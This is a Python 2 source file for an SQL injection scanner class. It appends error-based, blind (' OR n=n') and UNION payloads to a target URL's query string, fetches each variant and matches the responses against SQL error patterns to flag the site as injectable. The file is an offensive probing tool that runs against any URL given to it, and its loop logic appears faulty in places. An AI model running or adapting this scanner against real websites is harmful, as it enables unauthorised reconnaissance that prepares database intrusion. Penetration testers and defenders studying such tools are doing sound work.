import urllib2
import random
import re
from urlparse import urlparse
from bs4 import BeautifulSoup
from lib.core.settings import RANDOM_COMMON_COLUMN
from lib.core.settings import LOGGER
from lib.core.settings import SQLI_ERROR_REGEX
from lib.core.settings import SYNTAX_REGEX


class SQLiScanner(object):

    """ Scan a URL for SQL injection possibilities. """

    url_syntax = []
    vulnerable = False

    def __init__(self, url):
        self.url = url
        self.int = random.randint(1, 13)
        self.error_syntax = ["'", "--", ';', '"', "/*", "'/*", "'--", '"--', "';", '";', '`']
        self.blind_syntax = [" AND %i=%i" % (self.int, self.int),
                             " OR %i=%i" % (self.int, self.int)]
        self.union_syntax = [" union false {}".format(RANDOM_COMMON_COLUMN.strip()),
                             " UNION {}".format(RANDOM_COMMON_COLUMN.strip())]

    @staticmethod
    def obtain_inject_query(url):
        return urlparse(url).query

    def add_error_based_to_url(self):
        """ Add SQL closing syntax to the URL
        >>> print(self.add_error_based_to_url())
        http://example.com/php?id=2'
        http://example.com/php?id=2--
        ..."""
        error_based_injection = []
        for syntax in self.error_syntax:
            error_based_injection.append(self.url + syntax)

        return error_based_injection

    def add_blind_based_to_url(self):
        """ Add blind based injection syntax to the URL
        http://example.com/php?id=2 AND 13=13
        http://example.com/php?id=2 OR 13=13
        ..."""
        blind_based_injection = []
        for blind in self.blind_syntax:
            blind_based_injection.append(self.url + blind)

        return blind_based_injection

    def add_union_based_injection(self):
        """ Add union based injection syntax to the URL using random common columns
        http://example.com/php?id=2 union false bio
        http://example.com/php?id=2 UNION bio """
        union_based_injection = []
        for union in self.union_syntax:
            union_based_injection.append(self.url + union)

        return union_based_injection

    def sqli_search(self):
        soup = []
        count = 0
        current_sqli_count = 0
        query = self.obtain_inject_query(self.url)
        current_sqli_check = [self.add_blind_based_to_url(),
                              self.add_error_based_to_url(),
                              self.add_union_based_injection()]

        LOGGER.info("Starting SQLi search")
        while self.vulnerable is False:
            for url in current_sqli_check[current_sqli_count]:
                self.url_syntax = [re.search(SYNTAX_REGEX, url).group()]
                data = urllib2.urlopen(url).read()
                soup = [BeautifulSoup(data, 'html.parser')]
            for html in soup:
                count += 1
                for regex in SQLI_ERROR_REGEX:
                    if regex.findall(str(html)):
                        self.vulnerable = True
                        LOGGER.info("%s appears to have a SQL injection vulnerability at %s%s" % (
                            self.url, query, self.url_syntax[count - 1]))
                    else:
                        current_sqli_count += 1
                        self.url_syntax = self.url_syntax[::]
                        count = 0
        if self.vulnerable is False:
            LOGGER.warning("%s is not vulnerable to SQL injection, error, blind, or union based" % self.url)
